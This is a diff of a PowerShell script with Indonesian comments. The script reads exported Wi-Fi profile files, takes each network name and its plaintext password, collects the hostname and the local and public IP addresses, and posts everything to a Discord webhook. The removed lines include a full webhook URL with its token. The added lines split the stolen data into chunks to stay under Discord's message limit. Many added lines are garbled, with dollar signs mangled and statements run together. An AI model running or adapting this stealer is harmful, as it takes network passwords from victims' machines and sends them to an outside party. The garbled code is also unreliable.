@@ -1,31 +1,54 @@
 # Mengambil data profil Wi-Fi
-$d = Get-ChildItem (Join-Path $env:temp 'Wi*.xml') | ForEach-Object { 
-    [xml]$x = Get-Content $_.FullName
+\(d = Get-ChildItem (Join-Path\)env:temp 'Wi*.xml') | ForEach-Object { 
+    [xml]\(x = Get-Content\)_.FullName
     [PSCustomObject]@{ 
-        SSID = $x.WLANProfile.name
-        Pass = $x.WLANProfile.MSM.Security.sharedKey.keyMaterial 
+        SSID = \$x.WLANProfile.name
+        Pass = \$x.WLANProfile.MSM.Security.sharedKey.keyMaterial 
     } 
 }
 
 # Mengambil informasi Hostname dan IP
-$hostname = [System.Net.Dns]::GetHostName()
-$localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '
-$publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content
+\(hostname = [System.Net.Dns]::GetHostName()\)localIP  = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { \(_.InterfaceAlias -notlike '*Loopback*' }).IPAddress -join ', '\)publicIP = (Invoke-WebRequest -Uri "https://ipify.org" -UseBasicParsing).Content
 
-# Menyusun konten teks untuk Discord
-$wifiInfo = $d | Out-String
-$contentString = @"
+# Menyusun konten teks utama
+\$wifiInfo = \(d \vert{} Out-String\)fullContent = @"
 **System Info:**
-Hostname: $hostname
-Local IP: $localIP
-Public IP: $publicIP
+Hostname: \$hostname
+Local IP: \$localIP
+Public IP: \$publicIP
 
 **Wi-Fi Profiles:**
-$wifiInfo
+\$wifiInfo
 "@
 
-# Mengirim data jika profil Wi-Fi ditemukan
-if ($d) { 
-    $payload = @{ content = $contentString } | ConvertTo-Json
-    Invoke-WebRequest -Uri 'https://discord.com/api/webhooks/1552958439356104746/caHQV2SWyyaBZWNkRZKGbBK5-n1MPG9ftzToJBHwg0P-K7ueK7FUIbw79dl-PrSdmrda' -Method Post -Body $payload -ContentType 'application/json' -UseBasicParsing 
+# Fungsi untuk mengirim payload ke Discord
+function Send-DiscordWebhook (\$text) {
+    \(payload = @{ content =\)text } | ConvertTo-Json
+    Invoke-WebRequest -Uri 'https://discord.com' -Method Post -Body \$payload -ContentType 'application/json' -UseBasicParsing
+}
+
+# Eksekusi pengiriman dengan proteksi batas 2000 karakter
+if (\$d) {
+    if (\$fullContent.Length -le 1900) {
+        # Jika aman di bawah batas, kirim langsung sekali jalan
+        Send-DiscordWebhook \$fullContent
+    } else {
+        # Jika terlalu panjang, bagi teks per baris agar tidak merusak format data
+        \(lines =\)fullContent -split "`r`n"
+        \$currentChunk = ""
+
+        foreach (\(line in\)lines) {
+            if ((\(currentChunk.Length +\)line.Length + 2) -gt 1900) {
+                Send-DiscordWebhook \$currentChunk
+                Start-Sleep -Milliseconds 500 # Jeda singkat untuk menghindari rate limit Discord
+                \(currentChunk =\)line
+            } else {
+                if (\$currentChunk -eq "") { \(currentChunk =\)line }
+                else { \$currentChunk += "`r`n" + \$line }
+            }
+        }
+        if (\$currentChunk -ne "") {
+            Send-DiscordWebhook \$currentChunk
+        }
+    }
 }
